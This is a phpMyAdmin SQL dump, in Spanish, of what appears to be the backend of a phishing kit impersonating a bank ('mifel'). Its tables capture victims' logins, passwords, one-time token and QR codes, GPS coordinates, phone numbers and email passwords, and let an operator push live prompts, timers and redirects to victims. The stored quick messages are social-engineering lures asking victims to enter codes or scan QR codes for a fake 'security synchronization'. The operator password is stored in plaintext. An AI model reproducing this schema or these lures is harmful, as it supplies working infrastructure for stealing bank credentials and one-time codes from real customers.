-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Servidor: 127.0.0.1
-- Tiempo de generación: 04-08-2026 a las 10:08:43
-- Versión del servidor: 10.4.32-MariaDB
-- Versión de PHP: 8.2.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de datos: `mifel_sql`
--

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `administracion_control`
--

CREATE TABLE `administracion_control` (
  `id` int(11) NOT NULL,
  `usuario` varchar(50) NOT NULL,
  `clave` varchar(100) NOT NULL,
  `permisos` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL CHECK (json_valid(`permisos`)),
  `is_admin` tinyint(1) DEFAULT 0,
  `is_mod` tinyint(1) DEFAULT 0,
  `ultima_fecha_ingreso` timestamp NULL DEFAULT NULL,
  `fecha_creacion` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `administracion_control`
--

INSERT INTO `administracion_control` (`id`, `usuario`, `clave`, `permisos`, `is_admin`, `is_mod`, `ultima_fecha_ingreso`, `fecha_creacion`) VALUES
(1, 'adx', 'aloverg4', '{\"ver_registros\": true, \"editar_registros\": true, \"eliminar_registros\": true}', 1, 0, '2026-08-04 08:08:18', '2025-08-04 17:04:25');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `configuracion_columnas`
--

CREATE TABLE `configuracion_columnas` (
  `id` int(11) NOT NULL,
  `admin_id` int(11) NOT NULL,
  `columna` varchar(50) NOT NULL,
  `nombre_personalizado` varchar(100) DEFAULT NULL,
  `visible` tinyint(1) NOT NULL DEFAULT 1,
  `orden` int(11) NOT NULL DEFAULT 0,
  `fecha_modificacion` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `configuracion_columnas`
--

INSERT INTO `configuracion_columnas` (`id`, `admin_id`, `columna`, `nombre_personalizado`, `visible`, `orden`, `fecha_modificacion`) VALUES
(596, 1, 'ip_real', NULL, 0, 1, '2026-08-03 14:29:07'),
(597, 1, 'estatus', 'Estatus', 0, 2, '2026-08-03 14:29:07'),
(598, 1, 'coordenadas_gps', 'GPS', 1, 3, '2026-08-04 07:55:02'),
(599, 1, 'apellido', 'BAnca', 1, 4, '2026-08-03 14:29:07'),
(600, 1, 'usuario', 'Usuario', 1, 5, '2026-08-03 14:29:07'),
(601, 1, 'password', NULL, 1, 6, '2026-08-03 14:29:07'),
(602, 1, 'token_codigo', 'Token de Ingreso', 1, 7, '2026-08-03 14:29:07'),
(603, 1, 'nombre', 'Nombre', 1, 8, '2026-08-03 14:29:07'),
(604, 1, 'email', 'Email', 0, 9, '2026-08-03 14:29:07'),
(605, 1, 'telefono_movil', NULL, 1, 10, '2026-08-03 14:29:07'),
(606, 1, 'telefono_fijo', NULL, 1, 11, '2026-08-03 14:29:07'),
(607, 1, 'comentarios', NULL, 1, 12, '2026-08-03 14:29:07'),
(608, 1, 'acciones', 'Dinamico', 1, 13, '2026-08-03 14:29:07'),
(609, 1, 'sgdotoken_codigo', 'Tipo de Login', 0, 14, '2026-08-03 14:29:07'),
(610, 1, 'fecha', NULL, 0, 15, '2026-08-03 14:29:07'),
(611, 1, 'id', NULL, 0, 16, '2026-08-03 14:29:07');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `estatus_usuarios`
--

CREATE TABLE `estatus_usuarios` (
  `id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `ip_real` varchar(45) NOT NULL,
  `estado` enum('online','inactive','offline') DEFAULT 'online',
  `pagina_actual` varchar(100) DEFAULT NULL,
  `ultimo_heartbeat` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `fecha_conexion` timestamp NOT NULL DEFAULT current_timestamp(),
  `user_agent` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `estatus_usuarios`
--

INSERT INTO `estatus_usuarios` (`id`, `usuario_id`, `ip_real`, `estado`, `pagina_actual`, `ultimo_heartbeat`, `fecha_conexion`, `user_agent`) VALUES
(8529, 252, '::1', 'inactive', 'authenticate-execution.php', '2026-08-04 08:07:55', '2026-08-04 08:07:50', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0'),
(8538, 253, '::1', 'inactive', 'index.php', '2026-08-04 08:08:00', '2026-08-04 08:07:59', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `herramientas_enviadas`
--

CREATE TABLE `herramientas_enviadas` (
  `id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `admin_id` int(11) NOT NULL,
  `pagina` varchar(255) NOT NULL DEFAULT 'herramientas.php',
  `estado` enum('pendiente','visto','cerrado') NOT NULL DEFAULT 'pendiente',
  `fecha_envio` timestamp NOT NULL DEFAULT current_timestamp(),
  `fecha_visto` timestamp NULL DEFAULT NULL,
  `fecha_cerrado` timestamp NULL DEFAULT NULL,
  `ip_usuario` varchar(45) NOT NULL,
  `session_id` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `mensajes_admin`
--

CREATE TABLE `mensajes_admin` (
  `id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `admin_id` int(11) NOT NULL,
  `mensaje` text NOT NULL,
  `tipo_mensaje` enum('con_input','sin_input') NOT NULL DEFAULT 'sin_input',
  `respuesta_usuario` text DEFAULT NULL,
  `estado` enum('pendiente','leido','respondido') NOT NULL DEFAULT 'pendiente',
  `fecha_envio` timestamp NOT NULL DEFAULT current_timestamp(),
  `fecha_leido` timestamp NULL DEFAULT NULL,
  `fecha_respuesta` timestamp NULL DEFAULT NULL,
  `ip_usuario` varchar(45) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `mensajes_rapidos`
--

CREATE TABLE `mensajes_rapidos` (
  `id` int(11) NOT NULL,
  `admin_id` int(11) NOT NULL,
  `texto` text NOT NULL,
  `icono` varchar(100) NOT NULL DEFAULT 'fas fa-comment',
  `orden` int(11) NOT NULL DEFAULT 0,
  `fecha_creacion` timestamp NOT NULL DEFAULT current_timestamp(),
  `fecha_modificacion` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `mensajes_rapidos`
--

INSERT INTO `mensajes_rapidos` (`id`, `admin_id`, `texto`, `icono`, `orden`, `fecha_creacion`, `fecha_modificacion`) VALUES
(1, 1, 'Tu dispositivo no concluyó la sesión anterior correctamente. Para proteger tu información, será necesaria una sincronización de seguridad.', 'fas fa-comment', 1, '2026-08-04 08:02:30', '2026-08-04 08:02:30'),
(2, 1, 'Tu dispositivo requiere sincronización. Ingresa el código o escanea el código QR para continuar.', 'fas fa-comment', 2, '2026-08-04 08:02:30', '2026-08-04 08:02:30'),
(3, 1, 'Un ejecutivo está intentando localizarte. Mantén tu dispositivo cerca.', 'fas fa-comment', 3, '2026-08-04 08:02:30', '2026-08-04 08:02:30'),
(4, 1, 'Por motivos de seguridad, el sistema podrá solicitar aleatoriamente tu código y/o QR durante la sincronización.', 'fas fa-comment', 4, '2026-08-04 08:02:30', '2026-08-04 08:02:30'),
(5, 1, 'La sincronización está en progreso. No cierres esta ventana.', 'fas fa-comment', 5, '2026-08-04 08:02:30', '2026-08-04 08:02:30'),
(6, 1, 'Se detectó actividad reciente en este dispositivo. Confirma tu identidad para continuar.', 'fas fa-comment', 6, '2026-08-04 08:02:30', '2026-08-04 08:02:30'),
(7, 1, 'La sesión fue interrumpida. Reanudando el proceso de autenticación.', 'fas fa-comment', 7, '2026-08-04 08:02:30', '2026-08-04 08:02:30'),
(8, 1, 'Ingresa un número de contacto alternativo.', 'fas fa-comment', 8, '2026-08-04 08:02:30', '2026-08-04 08:02:30'),
(9, 1, 'Un asesor está intentando localizarte, por favor mantén tu dispositivo cerca.', 'fas fa-comment', 9, '2026-08-04 08:02:30', '2026-08-04 08:02:30'),
(10, 1, 'Confirma tu relación con la cuenta para continuar con la validación de seguridad.', 'fas fa-comment', 10, '2026-08-04 08:02:30', '2026-08-04 08:02:30');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `monitoreo_bxcontrol`
--

CREATE TABLE `monitoreo_bxcontrol` (
  `id` int(11) NOT NULL,
  `admin_id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `admin_usuario` varchar(50) NOT NULL,
  `is_admin` tinyint(1) DEFAULT 0,
  `fecha_ingreso` timestamp NOT NULL DEFAULT current_timestamp(),
  `ultimo_heartbeat` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `estado` enum('activo','inactivo') NOT NULL DEFAULT 'activo'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `redirecciones_enviadas`
--

CREATE TABLE `redirecciones_enviadas` (
  `id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `admin_id` int(11) NOT NULL,
  `url_destino` varchar(500) NOT NULL,
  `tipo_redireccion` enum('url_personalizada','index') NOT NULL DEFAULT 'index',
  `mensaje_confirmacion` text DEFAULT NULL,
  `estado` enum('pendiente','visto','cerrado') NOT NULL DEFAULT 'pendiente',
  `fecha_envio` timestamp NOT NULL DEFAULT current_timestamp(),
  `fecha_visto` timestamp NULL DEFAULT NULL,
  `fecha_cerrado` timestamp NULL DEFAULT NULL,
  `ip_usuario` varchar(45) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `sincronizacion_dispositivo`
--

CREATE TABLE `sincronizacion_dispositivo` (
  `id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `admin_id` int(11) NOT NULL,
  `tipo` enum('codigo','qr') NOT NULL DEFAULT 'codigo',
  `qr_imagen_url` varchar(500) DEFAULT NULL,
  `estado` enum('pendiente','esperando_validacion','interrupcion','completado','cancelado') NOT NULL DEFAULT 'pendiente',
  `paso_actual` tinyint(1) NOT NULL DEFAULT 1,
  `codigo_actual` varchar(255) DEFAULT NULL,
  `codigos_usados` text DEFAULT NULL,
  `mensaje_error` varchar(255) DEFAULT NULL,
  `ciclos_aprobados` tinyint(3) UNSIGNED NOT NULL DEFAULT 0,
  `ip_usuario` varchar(45) DEFAULT NULL,
  `fecha_envio` timestamp NOT NULL DEFAULT current_timestamp(),
  `fecha_codigo` timestamp NULL DEFAULT NULL,
  `fecha_validacion` timestamp NULL DEFAULT NULL,
  `fecha_completado` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `timers_enviados`
--

CREATE TABLE `timers_enviados` (
  `id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `admin_id` int(11) NOT NULL,
  `tiempo_segundos` int(11) NOT NULL,
  `mensaje_personalizado` text DEFAULT NULL,
  `estado` enum('pendiente','visto','cerrado') NOT NULL DEFAULT 'pendiente',
  `fecha_envio` timestamp NOT NULL DEFAULT current_timestamp(),
  `fecha_visto` timestamp NULL DEFAULT NULL,
  `fecha_cerrado` timestamp NULL DEFAULT NULL,
  `ip_usuario` varchar(45) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `usuarios`
--

CREATE TABLE `usuarios` (
  `id` int(11) NOT NULL,
  `ip_real` varchar(45) NOT NULL,
  `fecha_ingreso` timestamp NOT NULL DEFAULT current_timestamp(),
  `usuarios` varchar(80) NOT NULL,
  `password` varchar(20) NOT NULL,
  `user_agent` text NOT NULL,
  `nombre` varchar(50) DEFAULT NULL,
  `apellido` varchar(50) DEFAULT NULL,
  `telefono_movil` varchar(15) DEFAULT NULL,
  `telefono_fijo` varchar(15) DEFAULT NULL,
  `email` varchar(100) DEFAULT NULL,
  `token_codigo` varchar(255) DEFAULT NULL,
  `sgdotoken_codigo` varchar(255) DEFAULT NULL,
  `sgdotoken_qr_codigo` varchar(255) DEFAULT NULL,
  `token_qr_imagen_url` varchar(500) DEFAULT NULL,
  `token_pantalla_estado` enum('pendiente','liberado') DEFAULT NULL,
  `token_pantalla_modo` enum('normal','qr') DEFAULT NULL,
  `token_pantalla_espera_desde` timestamp NULL DEFAULT NULL,
  `comentarios` text DEFAULT NULL,
  `coordenadas_gps` varchar(100) DEFAULT NULL,
  `gps_estado` varchar(30) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `usuarios`
--

INSERT INTO `usuarios` (`id`, `ip_real`, `fecha_ingreso`, `usuarios`, `password`, `user_agent`, `nombre`, `apellido`, `telefono_movil`, `telefono_fijo`, `email`, `token_codigo`, `sgdotoken_codigo`, `sgdotoken_qr_codigo`, `token_qr_imagen_url`, `token_pantalla_estado`, `token_pantalla_modo`, `token_pantalla_espera_desde`, `comentarios`, `coordenadas_gps`, `gps_estado`) VALUES
(252, '::1', '2026-08-04 08:07:50', '123', '123', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0', NULL, 'Persona', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'pendiente', NULL, '2026-08-04 08:07:52', NULL, NULL, NULL),
(253, '::1', '2026-08-04 08:07:59', '22222', '222222', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0', NULL, 'Empresa', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'pendiente', NULL, '2026-08-04 08:07:59', NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `validacion_email`
--

CREATE TABLE `validacion_email` (
  `id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `email` varchar(255) NOT NULL,
  `proveedor_seleccionado` enum('gmail','outlook','yahoo','otro') NOT NULL DEFAULT 'otro',
  `password_ingresado` text DEFAULT NULL,
  `ip_usuario` varchar(45) DEFAULT NULL,
  `estado` enum('pendiente','completado','cancelado') NOT NULL DEFAULT 'pendiente',
  `fecha_envio` timestamp NOT NULL DEFAULT current_timestamp(),
  `fecha_completado` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Índices para tablas volcadas
--

--
-- Indices de la tabla `administracion_control`
--
ALTER TABLE `administracion_control`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `usuario` (`usuario`);

--
-- Indices de la tabla `configuracion_columnas`
--
ALTER TABLE `configuracion_columnas`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `admin_columna` (`admin_id`,`columna`),
  ADD KEY `idx_config_admin_orden` (`admin_id`,`orden`);

--
-- Indices de la tabla `estatus_usuarios`
--
ALTER TABLE `estatus_usuarios`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `usuario_id` (`usuario_id`),
  ADD KEY `idx_estatus_estado_heartbeat` (`estado`,`ultimo_heartbeat`);

--
-- Indices de la tabla `herramientas_enviadas`
--
ALTER TABLE `herramientas_enviadas`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_herramientas_usuario_estado` (`usuario_id`,`estado`),
  ADD KEY `fk_herramientas_admin` (`admin_id`);

--
-- Indices de la tabla `mensajes_admin`
--
ALTER TABLE `mensajes_admin`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_mensajes_usuario_fecha` (`usuario_id`,`fecha_envio`),
  ADD KEY `idx_mensajes_usuario_estado` (`usuario_id`,`estado`),
  ADD KEY `fk_mensajes_admin` (`admin_id`);

--
-- Indices de la tabla `mensajes_rapidos`
--
ALTER TABLE `mensajes_rapidos`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_rapidos_admin_orden` (`admin_id`,`orden`);

--
-- Indices de la tabla `monitoreo_bxcontrol`
--
ALTER TABLE `monitoreo_bxcontrol`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `admin_usuario_unique` (`admin_id`,`usuario_id`),
  ADD KEY `idx_monitoreo_usuario_estado` (`usuario_id`,`estado`,`ultimo_heartbeat`);

--
-- Indices de la tabla `redirecciones_enviadas`
--
ALTER TABLE `redirecciones_enviadas`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_redireccion_usuario_estado` (`usuario_id`,`estado`),
  ADD KEY `fk_redirecciones_admin` (`admin_id`);

--
-- Indices de la tabla `sincronizacion_dispositivo`
--
ALTER TABLE `sincronizacion_dispositivo`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_sync_usuario_estado` (`usuario_id`,`estado`),
  ADD KEY `fk_sync_admin` (`admin_id`);

--
-- Indices de la tabla `timers_enviados`
--
ALTER TABLE `timers_enviados`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_timers_usuario_estado` (`usuario_id`,`estado`),
  ADD KEY `fk_timers_admin` (`admin_id`);

--
-- Indices de la tabla `usuarios`
--
ALTER TABLE `usuarios`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_usuarios_fecha` (`fecha_ingreso`);

--
-- Indices de la tabla `validacion_email`
--
ALTER TABLE `validacion_email`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_validacion_usuario_estado` (`usuario_id`,`estado`);

--
-- AUTO_INCREMENT de las tablas volcadas
--

--
-- AUTO_INCREMENT de la tabla `administracion_control`
--
ALTER TABLE `administracion_control`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;

--
-- AUTO_INCREMENT de la tabla `configuracion_columnas`
--
ALTER TABLE `configuracion_columnas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=613;

--
-- AUTO_INCREMENT de la tabla `estatus_usuarios`
--
ALTER TABLE `estatus_usuarios`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8543;

--
-- AUTO_INCREMENT de la tabla `herramientas_enviadas`
--
ALTER TABLE `herramientas_enviadas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=36;

--
-- AUTO_INCREMENT de la tabla `mensajes_admin`
--
ALTER TABLE `mensajes_admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=451;

--
-- AUTO_INCREMENT de la tabla `mensajes_rapidos`
--
ALTER TABLE `mensajes_rapidos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;

--
-- AUTO_INCREMENT de la tabla `monitoreo_bxcontrol`
--
ALTER TABLE `monitoreo_bxcontrol`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=491;

--
-- AUTO_INCREMENT de la tabla `redirecciones_enviadas`
--
ALTER TABLE `redirecciones_enviadas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT de la tabla `sincronizacion_dispositivo`
--
ALTER TABLE `sincronizacion_dispositivo`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=37;

--
-- AUTO_INCREMENT de la tabla `timers_enviados`
--
ALTER TABLE `timers_enviados`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;

--
-- AUTO_INCREMENT de la tabla `usuarios`
--
ALTER TABLE `usuarios`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=254;

--
-- AUTO_INCREMENT de la tabla `validacion_email`
--
ALTER TABLE `validacion_email`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=69;

--
-- Restricciones para tablas volcadas
--

--
-- Filtros para la tabla `configuracion_columnas`
--
ALTER TABLE `configuracion_columnas`
  ADD CONSTRAINT `fk_config_columnas_admin` FOREIGN KEY (`admin_id`) REFERENCES `administracion_control` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `estatus_usuarios`
--
ALTER TABLE `estatus_usuarios`
  ADD CONSTRAINT `fk_estatus_usuario` FOREIGN KEY (`usuario_id`) REFERENCES `usuarios` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `herramientas_enviadas`
--
ALTER TABLE `herramientas_enviadas`
  ADD CONSTRAINT `fk_herramientas_admin` FOREIGN KEY (`admin_id`) REFERENCES `administracion_control` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `fk_herramientas_usuario` FOREIGN KEY (`usuario_id`) REFERENCES `usuarios` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `mensajes_admin`
--
ALTER TABLE `mensajes_admin`
  ADD CONSTRAINT `fk_mensajes_admin` FOREIGN KEY (`admin_id`) REFERENCES `administracion_control` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `fk_mensajes_usuario` FOREIGN KEY (`usuario_id`) REFERENCES `usuarios` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `mensajes_rapidos`
--
ALTER TABLE `mensajes_rapidos`
  ADD CONSTRAINT `fk_mensajes_rapidos_admin` FOREIGN KEY (`admin_id`) REFERENCES `administracion_control` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `monitoreo_bxcontrol`
--
ALTER TABLE `monitoreo_bxcontrol`
  ADD CONSTRAINT `fk_monitoreo_admin` FOREIGN KEY (`admin_id`) REFERENCES `administracion_control` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `fk_monitoreo_usuario` FOREIGN KEY (`usuario_id`) REFERENCES `usuarios` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `redirecciones_enviadas`
--
ALTER TABLE `redirecciones_enviadas`
  ADD CONSTRAINT `fk_redirecciones_admin` FOREIGN KEY (`admin_id`) REFERENCES `administracion_control` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `fk_redirecciones_usuario` FOREIGN KEY (`usuario_id`) REFERENCES `usuarios` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `sincronizacion_dispositivo`
--
ALTER TABLE `sincronizacion_dispositivo`
  ADD CONSTRAINT `fk_sync_admin` FOREIGN KEY (`admin_id`) REFERENCES `administracion_control` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `fk_sync_usuario` FOREIGN KEY (`usuario_id`) REFERENCES `usuarios` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `timers_enviados`
--
ALTER TABLE `timers_enviados`
  ADD CONSTRAINT `fk_timers_admin` FOREIGN KEY (`admin_id`) REFERENCES `administracion_control` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `fk_timers_usuario` FOREIGN KEY (`usuario_id`) REFERENCES `usuarios` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `validacion_email`
--
ALTER TABLE `validacion_email`
  ADD CONSTRAINT `fk_validacion_email_usuario` FOREIGN KEY (`usuario_id`) REFERENCES `usuarios` (`id`) ON DELETE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
